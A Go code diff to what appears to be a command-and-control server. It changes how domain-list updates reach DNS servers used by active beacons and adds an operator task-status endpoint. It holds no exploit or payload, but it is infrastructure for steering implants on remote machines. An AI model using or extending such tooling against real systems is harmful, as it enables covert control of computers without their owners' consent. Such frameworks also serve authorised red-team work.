@@ -855,8 +855,7 @@ func (api *APIServer) handleDNSServerCheckin(w http.ResponseWriter, r *http.Requ
 		}
 	}
 
-	// If this is the first checkin, broadcast domain list to ALL DNS servers
-	// This ensures all beacons learn about the new DNS server
+	// If this is the first checkin, broadcast domain list to all beacons
 	if isFirstCheckin {
 		go func() {
 			// Get all active DNS domains
@@ -868,31 +867,27 @@ func (api *APIServer) handleDNSServerCheckin(w http.ResponseWriter, r *http.Requ
 				return
 			}
 
-			// Get all active DNS servers
-			dnsServers, err := api.db.GetDNSServers()
+			// Get all active beacons to determine which DNS servers they're using
+			activeBeacons, err := api.db.GetActiveBeacons(30)
 			if err != nil {
 				if api.config.Debug {
-					fmt.Printf("[Master] Failed to get DNS servers: %v\n", err)
+					fmt.Printf("[Master] Failed to get active beacons: %v\n", err)
 				}
 				return
 			}
 
-			// Queue domain updates for ALL active DNS servers
-			// This allows all beacons (regardless of which server they're currently using)
-			// to learn about the new DNS server and rotate to it
-			updateCount := 0
-			for _, server := range dnsServers {
-				serverID, ok := server["id"].(string)
-				if !ok || serverID == "" {
-					continue
+			// Build a map of DNS server IDs that have active beacons
+			dnsServersWithBeacons := make(map[string]bool)
+			for _, beacon := range activeBeacons {
+				if serverID, ok := beacon["dns_server_id"].(string); ok && serverID != "" {
+					dnsServersWithBeacons[serverID] = true
 				}
-				
-				status, ok := server["status"].(string)
-				if !ok || status != "active" {
-					continue
-				}
+			}
 
-				// Queue the update for this DNS server
+			// Queue domain updates ONLY for DNS servers with active beacons
+			// This ensures beacons get updates from the servers they're actually using
+			updateCount := 0
+			for serverID := range dnsServersWithBeacons {
 				if err := api.db.QueueDomainUpdate(serverID, domains); err != nil {
 					if api.config.Debug {
 						fmt.Printf("[Master] ⚠️  Failed to queue domain update for %s: %v\n", serverID, err)
@@ -903,10 +898,10 @@ func (api *APIServer) handleDNSServerCheckin(w http.ResponseWriter, r *http.Requ
 			}
 
 			if updateCount > 0 {
-				fmt.Printf("[Master] 🔄 Queued domain updates for %d active DNS server(s) (new server joined: %s)\n", updateCount, dnsServerID)
+				fmt.Printf("[Master] 🔄 Queued domain updates for %d DNS server(s) with active beacons (new server joined: %s)\n", updateCount, dnsServerID)
 				fmt.Printf("[Master] Updated domain list: %v\n", domains)
 			} else {
-				fmt.Printf("[Master] ℹ️  No active DNS servers found to queue domain updates (new server: %s)\n", dnsServerID)
+				fmt.Printf("[Master] ℹ️  No active beacons found, no domain updates queued (new server: %s)\n", dnsServerID)
 			}
 		}()
 	}
@@ -1213,6 +1208,28 @@ func (api *APIServer) handleGetTask(w http.ResponseWriter, r *http.Request) {
 	}
 
 	api.sendJSON(w, task)
+}
+
+// handleGetTaskStatus returns the current status of a task
+func (api *APIServer) handleGetTaskStatus(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	taskID := vars["id"]
+
+	// Get task from database (lightweight query, no result data)
+	task, err := api.db.GetTaskWithResult(taskID)
+	if err != nil {
+		if err.Error() == "task not found" {
+			api.sendError(w, http.StatusNotFound, "task not found")
+		} else {
+			api.sendError(w, http.StatusInternalServerError, "failed to retrieve task")
+		}
+		return
+	}
+
+	// Return just the status
+	api.sendJSON(w, map[string]interface{}{
+		"status": task["status"],
+	})
 }
 
 // handleGetTaskResult returns the result for a specific task
@@ -2179,6 +2196,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	operatorRouter.HandleFunc("/tasks/{id}", api.handleDeleteTask).Methods("DELETE")
 	operatorRouter.HandleFunc("/tasks/{id}/result", api.handleGetTaskResult).Methods("GET")
 	operatorRouter.HandleFunc("/tasks/{id}/progress", api.handleGetTaskProgress).Methods("GET")
+	operatorRouter.HandleFunc("/tasks/{id}/status", api.handleGetTaskStatus).Methods("GET")
 	operatorRouter.HandleFunc("/stats", api.handleStats).Methods("GET")
 
 	// Builder endpoints
